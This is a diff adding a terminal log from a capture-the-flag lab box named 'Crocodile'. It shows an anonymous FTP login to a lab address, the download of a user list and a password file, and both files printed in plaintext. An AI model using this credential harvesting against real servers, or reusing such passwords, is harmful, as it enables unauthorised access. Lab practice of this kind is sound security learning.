@@ -1,0 +1,48 @@
+┌──(kali㉿kali)-[~/Documents/CTF Projects/Crocodile]
+└─$ ftp 10.129.242.36
+Connected to 10.129.242.36.
+220 (vsFTPd 3.0.3)
+Name (10.129.242.36:kali): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||44921|)
+150 Here comes the directory listing.
+-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
+-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
+226 Directory send OK.
+ftp> mget *allowed.userlist*
+mget allowed.userlist [anpqy?]? yes
+229 Entering Extended Passive Mode (|||41709|)
+150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
+100% |********************|    33      266.33 KiB/s    00:00 ETA
+226 Transfer complete.
+33 bytes received in 00:00 (0.22 KiB/s)
+mget allowed.userlist.passwd [anpqy?]? yes
+229 Entering Extended Passive Mode (|||47510|)
+150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
+100% |********************|    62      231.09 KiB/s    00:00 ETA
+226 Transfer complete.
+62 bytes received in 00:00 (0.29 KiB/s)
+ftp> exit
+221 Goodbye.
+                                                                 
+┌──(kali㉿kali)-[~/Documents/CTF Projects/Crocodile]
+└─$ ls
+allowed.userlist         version_service_scan_port21
+allowed.userlist.passwd
+                                                                 
+┌──(kali㉿kali)-[~/Documents/CTF Projects/Crocodile]
+└─$ cat allowed.userlist
+aron
+pwnmeow
+egotisticalsw
+admin
+
+┌──(kali㉿kali)-[~/…/Trash/files/Crocodile/FTP_files]
+└─$ cat allowed.userlist.passwd 
+root
+Supersecretpassword1
+@BaASD&9032123sADS
+rKXM59ESxesUFHAd
